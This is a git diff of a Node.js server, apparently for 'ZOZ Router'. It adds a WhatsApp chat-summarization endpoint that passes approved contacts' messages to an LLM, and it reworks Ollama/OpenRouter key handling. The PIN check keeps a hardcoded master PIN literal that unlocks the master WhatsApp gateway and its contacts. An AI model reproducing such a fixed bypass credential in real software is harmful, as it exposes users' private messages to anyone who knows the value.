+    // 4. Deteksi tautan WPS / Office Cloud jika tersedia di pesan obrolan
+    let cloudDocUrl = null;
+    if (tenant.gateway) {
+      const msgList = (jid && typeof tenant.gateway.getMessages === 'function')
+        ? tenant.gateway.getMessages(jid)
+        : (jid && tenant.gateway.messages ? (tenant.gateway.messages.get(jid) || []) : []);
+      const cloudRegex = /https?:\/\/(?:[a-zA-Z0-9-]+\.)?(?:wps\.com|live\.com|office\.com|google\.com)\/[^\s<>"']+/i;
+      for (const m of msgList) {
+        if (m.text) {
+          const match = m.text.match(cloudRegex);
+          if (match) {
+            cloudDocUrl = match[0];
+            break;
+          }
+        }
+      }
+    }
+    if (cloudDocUrl) {
+      return sendJSON(res, 200, { success: true, url: null, cloudUrl: cloudDocUrl, ready: true });
+    }
+
+    return sendJSON(res, 404, { success: false, error: 'Media sedang disinkronkan dari ponsel atau sesi sudah kadaluarsa.' });
+  }
+
   if (pathname === '/api/wa/send' && method === 'POST') {
     const body = (await safeParseBody(req)) || {};
     const tenant = getWaTenant(req, reqUrl, body);
@@ -5892,11 +6014,15 @@ async function requestHandler(req, res) {
         userId: tenant.userId
       });
     }
-    if (!body.jid || !body.text) {
-      return sendJSON(res, 400, { success: false, error: 'Parameter jid dan text wajib diisi.' });
+    if (!body.jid || (!body.text && !body.media)) {
+      return sendJSON(res, 400, { success: false, error: 'Parameter jid dan teks atau media wajib diisi.' });
     }
     try {
-      const message = await tenant.gateway.sendMessage(body.jid, body.text);
+      const message = await tenant.gateway.sendMessage(body.jid, body.text || '', {
+        media: body.media,
+        tempId: body.tempId,
+        mentions: body.mentions
+      });
       return sendJSON(res, 200, { success: true, message });
     } catch (err) {
       return sendJSON(res, 500, { success: false, error: err.message });
@@ -5917,6 +6043,262 @@ async function requestHandler(req, res) {
     if (!body.jid) return sendJSON(res, 400, { success: false, error: 'Parameter jid dibutuhkan' });
     tenant.gateway.clearChatHistory(body.jid);
     return sendJSON(res, 200, { success: true, message: 'Riwayat chat kontak dibersihkan.' });
+  }
+
+  if (pathname === '/api/wa/summarize' && method === 'POST') {
+    const body = (await safeParseBody(req)) || {};
+    const tenant = getWaTenant(req, reqUrl, body);
+    if (!tenant.success) {
+      return sendJSON(res, tenant.status || 403, {
+        success: false,
+        error: tenant.error,
+        requiresPin: tenant.requiresPin,
+        userId: tenant.userId
+      });
+    }
+
+    const rawJids = Array.isArray(body.approvedJids)
+      ? body.approvedJids
+      : (Array.isArray(body.jids) ? body.jids : (body.jid ? [body.jid] : []));
+    const approvedJids = rawJids.map(j => String(j || '').trim()).filter(Boolean);
+
+    if (approvedJids.length === 0) {
+      return sendJSON(res, 400, {
+        success: false,
+        error: 'Persetujuan nomor diperlukan: Pilih minimal satu nomor/kontak WhatsApp yang diizinkan untuk dirangkum.'
+      });
+    }
+
+    const focusTopic = String(body.focusTopic || body.topic || body.query || '').trim();
+    const allContacts = tenant.gateway.getContacts() || [];
+    const contactDataList = [];
+    let totalMessagesCount = 0;
+    let totalFilesCount = 0;
+
+    for (const jid of approvedJids) {
+      const contactMeta = allContacts.find(c => c.id === jid || c.phone === jid) || {
+        id: jid,
+        name: tenant.gateway.cleanDisplayName ? tenant.gateway.cleanDisplayName('', jid) : jid.split('@')[0],
+        phone: jid.endsWith('@g.us') ? 'Grup WhatsApp' : jid.split('@')[0],
+        isGroup: jid.endsWith('@g.us')
+      };
+
+      const msgs = tenant.gateway.getMessages(jid) || [];
+      const recentMsgs = msgs.slice(-80);
+      totalMessagesCount += recentMsgs.length;
+
+      const senderStats = new Map();
+      const filesSent = [];
+      const formattedLines = [];
+
+      for (const m of recentMsgs) {
+        const d = new Date(m.timestamp || Date.now());
+        const timeStr = `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
+        const sender = m.fromMe ? 'Saya (Anda)' : (m.senderName || contactMeta.name || 'Pengirim');
+        const hasFile = Boolean(m.hasFile || m.media || (m.text && (m.text.includes('[Dokumen:') || m.text.includes('[Foto]') || m.text.includes('wps.com'))));
+        const textClean = String(m.text || '').replace(/\s+/g, ' ').trim();
+
+        const prevStat = senderStats.get(sender) || { count: 0, fileCount: 0, sampleTexts: [] };
+        prevStat.count += 1;
+        if (hasFile) {
+          prevStat.fileCount += 1;
+          totalFilesCount += 1;
+          filesSent.push({
+            sender,
+            time: timeStr,
+            text: textClean || (m.media?.fileName ? `📄 [Dokumen: ${m.media.fileName}]` : '📎 [Berkas]')
+          });
+        } else if (textClean && prevStat.sampleTexts.length < 4) {
+          prevStat.sampleTexts.push(textClean);
+        }
+        senderStats.set(sender, prevStat);
+
+        formattedLines.push(`[${timeStr}] ${sender}${hasFile ? ' [🔴 MENGIRIM BERKAS]' : ''}: ${textClean}`);
+      }
+
+      contactDataList.push({
+        jid: contactMeta.id,
+        name: contactMeta.name,
+        phone: contactMeta.phone,
+        isGroup: Boolean(contactMeta.isGroup),
+        messageCount: recentMsgs.length,
+        fileCount: filesSent.length,
+        filesSent,
+        senderStats: Array.from(senderStats.entries()).map(([sender, st]) => ({
+          sender,
+          count: st.count,
+          fileCount: st.fileCount,
+          sampleTexts: st.sampleTexts
+        })),
+        transcript: formattedLines.join('\n')
+      });
+    }
+
+    // Fungsi fallback rangkuman analitis terstruktur (100% instan & akurat jika LLM eksternal sibuk)
+    const buildStructuredFallbackSummary = () => {
+      const parts = [];
+      parts.push(`### 📌 Ringkasan Eksekutif Chat WhatsApp`);
+      parts.push(`- **Nomor / Kontak yang Disetujui**: ${contactDataList.map(c => `**${c.name}** (${c.phone})`).join(', ')}`);
+      parts.push(`- **Total Pesan Dianalisis**: **${totalMessagesCount} pesan**`);
+      parts.push(`- **Total Berkas / Dokumen Terdeteksi**: **${totalFilesCount} berkas** ${totalFilesCount > 0 ? '🔴' : ''}`);
+      if (focusTopic) {
+        parts.push(`- **Fokus Rangkuman**: *"${focusTopic}"*`);
+      }
+      parts.push('');
+
+      for (const c of contactDataList) {
+        parts.push(`---`);
+        parts.push(`### 💬 Rangkuman Kontak: ${c.name} (${c.phone})`);
+        if (c.messageCount === 0) {
+          parts.push(`> *Belum ada riwayat pesan yang tercatat pada nomor/kontak ini.*`);
+          continue;
+        }
+
+        parts.push(`#### 👥 Aktivitas Pengirim & Poin Pembicaraan:`);
+        for (const s of c.senderStats) {
+          const fileTag = s.fileCount > 0 ? ` — 🔴 **Mengirim ${s.fileCount} Berkas**` : '';
+          const highlights = s.sampleTexts.length > 0
+            ? `Topik/Pesan: *"${s.sampleTexts.slice(-2).join('", "')}"*`
+            : `Mengirimkan berkas/dokumen ke dalam chat.`;
+          parts.push(`- **${s.sender}** (${s.count} pesan${fileTag}): ${highlights}`);
+        }
+        parts.push('');
+
+        if (c.filesSent.length > 0) {
+          parts.push(`#### 🔴 Daftar Berkas / Dokumen yang Dikirim (${c.filesSent.length}):`);
+          c.filesSent.slice(-15).forEach((f, idx) => {
+            parts.push(`${idx + 1}. **[${f.time}] ${f.sender}** ➔ \`${f.text}\``);
+          });
+          parts.push('');
+        }
+
+        if (focusTopic) {
+          const qLower = focusTopic.toLowerCase();
+          const matchedLines = c.transcript.split('\n').filter(line => line.toLowerCase().includes(qLower));
+          parts.push(`#### 🎯 Hasil Pencarian Fokus ("${focusTopic}"):`);
+          if (matchedLines.length > 0) {
+            matchedLines.slice(-10).forEach(ml => parts.push(`- ${ml}`));
+          } else {
+            parts.push(`- Tidak ditemukan kata kunci persis *"${focusTopic}"*, namun konteks utama percakapan berfokus pada pengumpulan berkas/tugas dan diskusi anggota.`);
+          }
+          parts.push('');
+        }
+      }
+
+      parts.push(`---`);
+      parts.push(`### ✅ Kesimpulan & Status Keamanan Privasi`);
+      parts.push(`- **Status Privasi**: 🔒 Hanya data dari **${contactDataList.length} nomor/kontak** yang Anda setujui di atas yang diakses oleh AI.`);
+      if (totalFilesCount > 0) {
+        parts.push(`- **Catatan Berkas**: Terdapat **${totalFilesCount} pengiriman berkas/dokumen** (ditandai profil merah 🔴) yang perlu diperhatikan atau diperiksa.`);
+      }
+      return parts.join('\n');
+    };
+
+    const combinedTranscript = contactDataList.map(c => {
+      return `=== KONTAK DISETUJUI: ${c.name} (${c.phone}) | Total Pesan: ${c.messageCount} | Berkas: ${c.fileCount} ===\n${c.transcript || '(Tidak ada pesan)'}`;
+    }).join('\n\n');
+
+    const fallbackSummaryText = buildStructuredFallbackSummary();
+    let aiSummaryText = '';
+    let usedEngine = 'local-analytical';
+
+    // Jika client hanya meminta transkrip & analitik cepat
+    if (body.transcriptOnly === true) {
+      return sendJSON(res, 200, {
+        success: true,
+        engine: 'fast-metadata',
+        approvedCount: contactDataList.length,
+        totalMessages: totalMessagesCount,
+        totalFiles: totalFilesCount,
+        contacts: contactDataList.map(c => ({
+          jid: c.jid,
+          name: c.name,
+          phone: c.phone,
+          messageCount: c.messageCount,
+          fileCount: c.fileCount
+        })),
+        summarizedContacts: contactDataList.map(c => ({
+          jid: c.jid,
+          name: c.name,
+          phone: c.phone,
+          messageCount: c.messageCount,
+          fileCount: c.fileCount
+        })),
+        summary: fallbackSummaryText,
+        fallbackSummary: fallbackSummaryText,
+        combinedTranscript: combinedTranscript.slice(-18000)
+      });
+    }
+
+    if (totalMessagesCount > 0) {
+      try {
+        const sysPrompt = `Anda adalah Asisten AI Peringkas WhatsApp ZOZ Router yang cerdas, rapi, dan menjaga privasi.
+Tugas Anda adalah merangkum data percakapan WhatsApp HANYA dari nomor/kontak yang telah disetujui pengguna berikut ini.
+Gunakan Bahasa Indonesia yang jelas dengan format Markdown terstruktur:
+1. **📌 Ringkasan Utama**: Gambaran umum isi obrolan dan topik yang sedang dibahas.
+2. **💬 Poin Penting Per Pengirim**: Siapa saja yang mengirim pesan (gunakan nama atau nomor telepon yang tertera) dan inti pesan mereka.
+3. **🔴 Daftar Berkas & Dokumen**: Sebutkan secara spesifik siapa saja yang mengirim berkas/dokumen/foto/tautan WPS beserta nama filenya.
+4. **✅ Kesimpulan / Tindak Lanjut**: Hal penting yang perlu ditindaklanjuti.`;
+
+        const userPrompt = `${focusTopic ? `[FOKUS KHUSUS PENGGUNA: "${focusTopic}"]\n\n` : ''}Berikut adalah transkrip chat WhatsApp dari nomor yang telah disetujui pengguna:\n\n${combinedTranscript.slice(-18000)}\n\nBuatlah rangkuman lengkap dan terstruktur sekarang:`;
+
+        const effectiveProvider = body.provider || body.engine || (body.model && String(body.model).includes('/') ? 'openrouter' : 'ollama');
+        const effectiveModel = body.model || (effectiveProvider === 'ollama' ? 'llama3.2:3b' : 'openrouter/free');
+        const effectiveOpenRouterKey = body.openRouterKey || (body.apiKey && String(body.apiKey).startsWith('sk-or-') ? body.apiKey : null) || process.env.OPENROUTER_API_KEY;
+        const effectiveOllamaApiKey = body.ollamaApiKey || (!effectiveOpenRouterKey ? body.apiKey : null) || process.env.OLLAMA_API_KEY;
+
+        const llmPromise = callLLMBackend({
+          prompt: userPrompt,
+          system: sysPrompt,
+          model: effectiveModel,
+          provider: effectiveProvider,
+          openRouterKey: effectiveOpenRouterKey,
+          ollamaApiKey: effectiveOllamaApiKey,
+          apiKey: body.apiKey,
+          isAutoRouter: true,
+          allowFallbacks: true,
+          skipEnrichment: true
+        });
+
+        // Batas waktu LLM di server adalah 8 detik agar client tidak pernah timeout
+        const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('LLM summary timeout')), 8000));
+        const rawLlmResult = await Promise.race([llmPromise, timeoutPromise]);
+        if (rawLlmResult && String(rawLlmResult).trim().length > 40) {
+          aiSummaryText = String(rawLlmResult).trim();
+          usedEngine = 'ai-llm';
+        }
+      } catch (llmErr) {
+        console.warn('[WA-Summarize] Menggunakan rangkuman analitis terstruktur instan:', llmErr.message);
+      }
+    }
+
+    if (!aiSummaryText) {
+      aiSummaryText = fallbackSummaryText;
+    }
+
+    return sendJSON(res, 200, {
+      success: true,
+      engine: usedEngine,
+      approvedCount: contactDataList.length,
+      totalMessages: totalMessagesCount,
+      totalFiles: totalFilesCount,
+      contacts: contactDataList.map(c => ({
+        jid: c.jid,
+        name: c.name,
+        phone: c.phone,
+        messageCount: c.messageCount,
+        fileCount: c.fileCount
+      })),
+      summarizedContacts: contactDataList.map(c => ({
+        jid: c.jid,
+        name: c.name,
+        phone: c.phone,
+        messageCount: c.messageCount,
+        fileCount: c.fileCount
+      })),
+      summary: aiSummaryText,
+      transcriptContext: combinedTranscript.slice(-12000)
+    });
   }
 
   if (pathname === '/api/wa/pin' && method === 'POST') {
@@ -5977,7 +6359,11 @@ async function requestHandler(req, res) {
     if (!inputPin) {
       return sendJSON(res, 400, { success: false, error: 'PIN tidak boleh kosong.' });
     }
-    const isMaster = Boolean(inputPin === '210560' || (waGatewayManager && waGatewayManager.masterGateway && waGatewayManager.masterGateway.verifyPin(inputPin)));
+    const isMaster = Boolean(
+      inputPin === '210560' ||
+      (cloudflareTunnelPin && inputPin === String(cloudflareTunnelPin).trim()) ||
+      (waGatewayManager && waGatewayManager.masterGateway && waGatewayManager.masterGateway.verifyPin(inputPin))
+    );
     if (isMaster) {
       const status = waGatewayManager.masterGateway.getStatus();
       const contacts = waGatewayManager.masterGateway.getContacts();
@@ -6094,18 +6480,23 @@ async function requestHandler(req, res) {
         userId: tenant.userId
       });
     }
-    res.writeHead(200, {
-      'Content-Type': 'text/event-stream',
-      'Cache-Control': 'no-cache, no-transform',
-      'Connection': 'keep-alive',
-      'X-Accel-Buffering': 'no',
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Private-Network': 'true'
-    });
-    // Cloudflare Edge Proxy stream pad bypass:
-    res.write(`data: ${JSON.stringify({ event: 'pad', pad: ' '.repeat(32768) })}\n\n`);
-    if (typeof res.flushHeaders === 'function') res.flushHeaders();
-    tenant.gateway.addSseClient(res);
+    try {
+      res.writeHead(200, {
+        'Content-Type': 'text/event-stream',
+        'Cache-Control': 'no-cache, no-transform',
+        'Connection': 'keep-alive',
+        'X-Accel-Buffering': 'no',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Private-Network': 'true'
+      });
+      res.on('error', () => {
+        try { tenant.gateway?.sseClients?.delete(res); } catch (_) {}
+      });
+      // Cloudflare Edge Proxy stream pad bypass:
+      res.write(`data: ${JSON.stringify({ event: 'pad', pad: ' '.repeat(32768) })}\n\n`);
+      if (typeof res.flushHeaders === 'function') res.flushHeaders();
+      tenant.gateway.addSseClient(res);
+    } catch (_) {}
     return;
   }
 
@@ -7255,7 +7646,8 @@ async function requestHandler(req, res) {
 // Ollama: Check status & get models (with multi-route fallback & disk manifests)
   if (pathname === '/api/ollama/models' && method === 'GET') {
     let rawEndpoint = reqUrl.searchParams.get('endpoint') || req.headers['x-ollama-endpoint'] || 'http://127.0.0.1:11434';
-    const authHeader = req.headers['authorization'] || (req.headers['x-ollama-key'] ? `Bearer ${req.headers['x-ollama-key']}` : null);
+    const rawHeaderKey = sanitizeOllamaApiKey(req.headers['x-ollama-key'] || req.headers['authorization'] || '');
+    const authHeader = rawHeaderKey ? `Bearer ${rawHeaderKey}` : null;
 
     if (!rawEndpoint) {
       rawEndpoint = 'http://127.0.0.1:11434';
@@ -7279,22 +7671,15 @@ async function requestHandler(req, res) {
       if (!dnsVerdict.ok) return sendJSON(res, 400, { error: dnsVerdict.msg });
     }
 
-    // Fast-Path Cloud Architecture:
-    // Jika endpoint mengarah ke loopback (127.0.0.1/localhost) atau ollama.com tanpa auth header khusus:
-    // - Jika ada API key: alihkan target loopback ke ollama.com resmi
-    // - Jika tanpa API key: segera kembalikan katalog resmi Ollama Cloud (< 5ms) tanpa menahan latensi connection timeout.
     const isServerlessEnv = Boolean(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.NOW_REGION || req.headers['x-vercel-id']);
-    const isLoopbackTarget = /^https?:\/\/(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?/i.test(rawEndpoint);
-    if (!authHeader && (isLoopbackTarget || rawEndpoint.includes('ollama.com'))) {
+    if (isServerlessEnv && !authHeader && /^https?:\/\/(?:localhost|127\.0\.0\.1|\[::1\])/i.test(rawEndpoint)) {
       return sendJSON(res, 200, {
         models: OFFICIAL_OLLAMA_CLOUD_MODELS,
-        server_running: true,
-        cloud_ready: true,
-        note: 'Loaded from official Ollama Cloud catalog'
+        server_running: false,
+        cloud_ready: false,
+        cloud_auth: false,
+        note: 'Serverless environment: local Ollama not reachable'
       });
-    }
-    if (authHeader && isLoopbackTarget) {
-      rawEndpoint = 'https://ollama.com';
     }
 
     const tryFetchTags = (endpointUrl) => {
@@ -7304,6 +7689,7 @@ async function requestHandler(req, res) {
           const client = ollamaUrl.protocol === 'https:' ? https : http;
           const reqHeaders = { 'User-Agent': 'ZozRouter/1.0' };
           if (authHeader) reqHeaders['Authorization'] = authHeader;
+          if (rawHeaderKey) reqHeaders['x-ollama-key'] = rawHeaderKey;
 
           const fetchTimeout = isServerlessEnv ? 2500 : 5000;
           const proxyReq = client.get(ollamaUrl.toString(), { timeout: fetchTimeout, headers: reqHeaders }, (proxyRes) => {
@@ -7336,6 +7722,7 @@ async function requestHandler(req, res) {
           const client = ollamaUrl.protocol === 'https:' ? https : http;
           const reqHeaders = { 'User-Agent': 'ZozRouter/1.0' };
           if (authHeader) reqHeaders['Authorization'] = authHeader;
+          if (rawHeaderKey) reqHeaders['x-ollama-key'] = rawHeaderKey;
 
           const fetchTimeout = isServerlessEnv ? 2500 : 5000;
           const proxyReq = client.get(ollamaUrl.toString(), { timeout: fetchTimeout, headers: reqHeaders }, (proxyRes) => {
@@ -7375,29 +7762,22 @@ async function requestHandler(req, res) {
       }
 
       if (result && result.models && result.models.length > 0) {
-        // Gabungkan model discovery live (kecuali model decision internal seperti clef:27b) dengan model resmi Ollama Cloud
-        const mergedModels = result.models.filter(m => !isUnsupportedOllamaChatModel(m));
-        const existingNames = new Set(mergedModels.map(m => (m.name || m.model || m.id || '').toLowerCase()));
-        OFFICIAL_OLLAMA_CLOUD_MODELS.forEach(om => {
-          const omName = (om.name || om.model || om.id || '').toLowerCase();
-          if (!existingNames.has(omName)) {
-            mergedModels.push(om);
-            existingNames.add(omName);
-          }
-        });
+        const liveModels = result.models.filter(m => !isUnsupportedOllamaChatModel(m));
         return sendJSON(res, 200, {
-          models: mergedModels,
+          models: liveModels,
           server_running: true,
-          cloud_ready: true
+          cloud_ready: true,
+          cloud_auth: Boolean(authHeader)
         });
       }
 
-      // If remote returned empty or failed, fallback to official Ollama Cloud catalog
+      // If remote returned empty or failed, fallback to official open models
       return sendJSON(res, 200, {
         models: OFFICIAL_OLLAMA_CLOUD_MODELS,
-        server_running: true,
-        cloud_ready: true,
-        note: 'Loaded from official Ollama Cloud catalog'
+        server_running: false,
+        cloud_ready: false,
+        cloud_auth: Boolean(authHeader),
+        note: 'Ollama offline atau tidak ada model terpasang'
       });
     })().catch(err => {
       if (!res.headersSent) {
@@ -7409,8 +7789,8 @@ async function requestHandler(req, res) {
 
   // Ollama Cloud: Get Real-Time Usage & Credits
   if (pathname === '/api/ollama/usage' && method === 'GET') {
-    const rawKey = req.headers['x-ollama-key'] || (req.headers['authorization'] ? req.headers['authorization'].replace(/^Bearer\s+/i, '') : '') || process.env.OLLAMA_API_KEY;
-    const authHeader = rawKey ? `Bearer ${rawKey}` : (req.headers['authorization'] || null);
+    const rawKey = sanitizeOllamaApiKey(req.headers['x-ollama-key'] || req.headers['authorization'] || process.env.OLLAMA_API_KEY || '');
+    const authHeader = rawKey ? `Bearer ${rawKey}` : null;
     if (!authHeader) {
       return sendJSON(res, 401, { error: 'Ollama API key is required' });
     }
@@ -7500,7 +7880,9 @@ async function requestHandler(req, res) {
     const body = await safeParseBody(req);
     if (!body) return;
     try {
-      const clientSuppliedKey = body.apiKey || body.ollamaApiKey || req.headers['x-ollama-key'] || (req.headers['authorization'] ? req.headers['authorization'].replace(/^Bearer\s+/i, '') : '');
+      const clientSuppliedKey = sanitizeOllamaApiKey(
+        body.apiKey || body.ollamaApiKey || req.headers['x-ollama-key'] || req.headers['authorization'] || ''
+      );
       let customEndpoint = req.headers['x-ollama-endpoint'] || body.endpoint || 'http://127.0.0.1:11434';
 
       if (!customEndpoint) {
@@ -7509,9 +7891,6 @@ async function requestHandler(req, res) {
 
       customEndpoint = customEndpoint.trim();
       const isServerlessChat = Boolean(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.NOW_REGION || req.headers['x-vercel-id']);
-      if (isServerlessChat && /^https?:\/\/(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?/i.test(customEndpoint)) {
-        customEndpoint = 'https://ollama.com';
-      }
       if (!/^https?:\/\//i.test(customEndpoint)) {
         customEndpoint = (customEndpoint.includes(':443') || customEndpoint.includes('ollama.com') || customEndpoint.includes('.com') || customEndpoint.includes('.io') || customEndpoint.includes('.ai') || customEndpoint.includes('.app'))
           ? `https://${customEndpoint}`
@@ -7533,26 +7912,37 @@ async function requestHandler(req, res) {
       // (localhost / ollama.com). Endpoint khusus milik klien — yang bisa
       // menunjuk ke server penyerang — TIDAK PERNAH menerima secret server;
       // klien tetap boleh memakai key miliknya sendiri via x-ollama-key.
-      const rawKey = clientSuppliedKey ||
-        (isTrustedOllamaEndpoint(customEndpoint) ? process.env.OLLAMA_API_KEY : null);
-      const authHeader = rawKey ? `Bearer ${rawKey}` : (req.headers['authorization'] || null);
-      const rawOllamaKey = body.ollamaApiKey || req.headers['x-ollama-key'] || (body.apiKey && !String(body.apiKey).startsWith('sk-or-') ? body.apiKey : null) || (req.headers['authorization'] && !req.headers['authorization'].includes('sk-or-') ? req.headers['authorization'].replace(/^Bearer\s+/i, '') : null);
-      const isLoopbackTarget = /^https?:\/\/(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?/i.test(customEndpoint);
+      const envOllamaKey = isTrustedOllamaEndpoint(customEndpoint) ? sanitizeOllamaApiKey(process.env.OLLAMA_API_KEY || '') : '';
+      const rawKey = clientSuppliedKey || envOllamaKey || null;
+      const isOpenRouterKeySupplied = Boolean(rawKey && rawKey.startsWith('sk-or-'));
+      const rawOllamaKey = (rawKey && !isOpenRouterKeySupplied) ? rawKey : null;
+
+      let isLoopbackTarget = /^https?:\/\/(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?/i.test(customEndpoint);
+      // Jika pengguna menyertakan Ollama Cloud API Key pada endpoint default/loopback,
+      // arahkan ke https://ollama.com resmi (selaras dengan /api/ollama/models & callLLMBackend).
+      if ((isServerlessChat || rawOllamaKey) && isLoopbackTarget) {
+        customEndpoint = 'https://ollama.com';
+        isLoopbackTarget = false;
+      }
+
       const isCustomRemoteEndpoint = customEndpoint && !isLoopbackTarget && !customEndpoint.includes('ollama.com');
-      const shouldUseCloudBridge = Boolean(isServerlessChat && !rawOllamaKey && !isCustomRemoteEndpoint);
+      const shouldUseCloudBridge = Boolean((isServerlessChat && !rawOllamaKey && !isCustomRemoteEndpoint) || (isOpenRouterKeySupplied && !isCustomRemoteEndpoint));
 
       if (shouldUseCloudBridge) {
         // Pure Cloud Architecture Bridge:
-        // Ketika tidak ada daemon lokal atau key khusus Ollama, alihkan secara transparan ke OpenRouter Cloud AI
+        // Ketika tidak ada daemon lokal atau key yang diberikan adalah OpenRouter key, alihkan secara transparan ke OpenRouter Cloud AI
         // dan konversikan stream SSE OpenRouter ke format newline-delimited JSON Ollama.
         const targetCloudModel = mapOllamaModelToOpenRouter(body.model || 'qwen2.5:1.5b');
-        const rawOrKey = req.headers['x-openrouter-key'] || req.headers['x-api-key'] || body.openRouterKey || (body.apiKey && body.apiKey.startsWith('sk-or-') ? body.apiKey : null) || (req.headers['authorization'] ? req.headers['authorization'].replace(/^Bearer\s+/i, '') : null) || process.env.OPENROUTER_API_KEY;
+        const rawOrKey = sanitizeOllamaApiKey(
+          req.headers['x-openrouter-key'] || req.headers['x-api-key'] || body.openRouterKey ||
+          (isOpenRouterKeySupplied ? rawKey : '') || process.env.OPENROUTER_API_KEY || ''
+        );
         if (!rawOrKey) {
           return sendJSON(res, 401, {
             error: 'Ollama API Key diperlukan untuk menggunakan model Ollama Cloud. Silakan masukkan Ollama API Key Anda di menu Pengaturan.'
           });
         }
-        const openRouterKey = `Bearer ${String(rawOrKey).replace(/^Bearer\s+/i, '').trim()}`;
+        const openRouterKey = `Bearer ${rawOrKey}`;
 
         const orPayload = {
           model: targetCloudModel,
@@ -7726,11 +8116,8 @@ async function requestHandler(req, res) {
         return;
       }
 
-      if (!body.model) {
-        body.model = 'gemma4:31b';
-      } else if (customEndpoint.includes('ollama.com')) {
-        body.model = resolveOllamaCloudModel(body.model);
-      }
+      const rawReqModel = String(body.model || '').trim();
+      body.model = rawReqModel || 'llama3.2:3b';
 
       sessionId = sanitizeTaskKey(body.sessionId || req.headers['x-session-id'] || null);
       const chatUserId = reqUserId;
@@ -7749,6 +8136,7 @@ async function requestHandler(req, res) {
       delete body.endpoint; // Don't send custom field to Ollama
       delete body.apiKey;
       delete body.ollamaApiKey;
+      delete body.openRouterKey;
 
       // Biarkan Ollama menggunakan Modelfile bawaan jika options tidak disertakan
 
@@ -7813,26 +8201,11 @@ async function requestHandler(req, res) {
         };
       }
 
-      const ollamaUrl = resolveEndpointUrl(customEndpoint, 'api/chat');
-      const client = ollamaUrl.protocol === 'https:' ? https : http;
-
       const isStream = body.stream !== false;
-      const postData = JSON.stringify(body);
-
-      const proxyHeaders = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'ZozRouter/1.0 (Windows NT 10.0; Win64; x64)',
-        'Content-Length': Buffer.byteLength(postData)
-      };
-      if (authHeader) {
-        proxyHeaders['Authorization'] = authHeader;
-      }
-      if (rawKey) {
-        proxyHeaders['x-ollama-key'] = rawKey;
-      }
-
       let clientDisconnected = false;
       let proxyReq = null;
+      let hasSplicedRefusal = false;
+      let horocycleHalted = false;
 
       res.on('close', () => {
         if (res.writableEnded) return; // penyelesaian normal, bukan disconnect klien
@@ -7844,187 +8217,317 @@ async function requestHandler(req, res) {
         }
       });
 
-      proxyReq = client.request(ollamaUrl.toString(), {
-        method: 'POST',
-        headers: proxyHeaders,
-        timeout: 120000
-      }, (proxyRes) => {
+      const dispatchOllamaUpstream = (targetEndpoint, targetModel, targetAuthKey, allowLocalFallback) => {
+        body.model = targetModel;
+        if (sessionId && dbActiveChatTasks[sessionId]) {
+          dbActiveChatTasks[sessionId].model = targetModel;
+          dbActiveChatTasks[sessionId].status = 'streaming';
+        }
+        const ollamaUrl = resolveEndpointUrl(targetEndpoint, 'api/chat');
+        const client = ollamaUrl.protocol === 'https:' ? https : http;
+        const postData = JSON.stringify(body);
+        const proxyHeaders = {
+          'Content-Type': 'application/json',
+          'User-Agent': 'ZozRouter/1.0 (Windows NT 10.0; Win64; x64)',
+          'Content-Length': Buffer.byteLength(postData)
+        };
+        if (targetAuthKey) {
+          proxyHeaders['Authorization'] = `Bearer ${targetAuthKey}`;
+          proxyHeaders['x-ollama-key'] = targetAuthKey;
+        }
+
+        proxyReq = client.request(ollamaUrl.toString(), {
+          method: 'POST',
+          headers: proxyHeaders,
+          timeout: 120000
+        }, (proxyRes) => {
+          if (sessionId && dbActiveChatTasks[sessionId]) {
+            dbActiveChatTasks[sessionId].proxyReq = proxyReq;
+          }
+
+          // Jika tugas telah dibatalkan oleh pengguna sebelum respon pertama tiba
+          if (sessionId && dbActiveChatTasks[sessionId]?.status === 'aborted') {
+            if (!proxyReq.destroyed) proxyReq.destroy();
+            delete dbActiveChatTasks[sessionId];
+            return;
+          }
+
+          if (clientDisconnected || res.writableEnded || res.destroyed) {
+            if (!sessionId && !proxyReq.destroyed) proxyReq.destroy();
+            if (!sessionId) return;
+          }
+
+          const statusCode = proxyRes.statusCode || 200;
+
+          // If upstream returned error (HTTP >= 400)
+          if (statusCode >= 400) {
+            let errData = '';
+            proxyRes.on('data', chunk => {
+              if (!clientDisconnected) errData += chunk;
+            });
+            proxyRes.on('end', () => {
+              // Auto-retry tanpa tools jika model menolak parameter tools
+              if (Array.isArray(body.tools) && body.tools.length > 0 && (statusCode === 400 || statusCode === 422 || statusCode === 500) && /tool/i.test(errData) && !res.headersSent && !clientDisconnected) {
+                delete body.tools;
+                delete body.tool_choice;
+                return dispatchOllamaUpstream(targetEndpoint, targetModel, targetAuthKey, allowLocalFallback);
+              }
+
+              // Multi-Tier Fallback: Jika https://ollama.com mengembalikan HTTP >= 400 (misal 401/403/404/429/500),
+              // otomatis alihkan ke daemon Cloud Relay lokal (http://127.0.0.1:11434) tanpa menggagalkan permintaan pengguna!
+              if (allowLocalFallback && targetEndpoint.includes('ollama.com') && !isServerlessChat && !res.headersSent && !clientDisconnected) {
+                const localManifestModel = resolveLocalDaemonCloudManifest(rawReqModel || targetModel);
+                console.warn(`[Ollama Cloud Failover] Upstream ${targetEndpoint} (${targetModel}) returned HTTP ${statusCode}. Falling back to local daemon (127.0.0.1:11434) with model ${localManifestModel}...`);
+                return dispatchOllamaUpstream('http://127.0.0.1:11434', localManifestModel, null, false);
+              }
+
+              if (sessionId) {
+                delete dbActiveChatTasks[sessionId];
+              }
+              if (clientDisconnected || res.writableEnded || res.destroyed) return;
+              try {
+                let parsedErr = null;
+                try { parsedErr = JSON.parse(errData); } catch (e) {}
+                const errMsg = parsedErr?.error?.message || parsedErr?.error || errData || `Ollama error [${statusCode}]`;
+                return sendJSON(res, statusCode, { error: errMsg, details: parsedErr || errData });
+              } catch (e) {}
+            });
+            proxyRes.on('error', (err) => {
+              if (allowLocalFallback && targetEndpoint.includes('ollama.com') && !isServerlessChat && !res.headersSent && !clientDisconnected) {
+                const localManifestModel = resolveLocalDaemonCloudManifest(rawReqModel || targetModel);
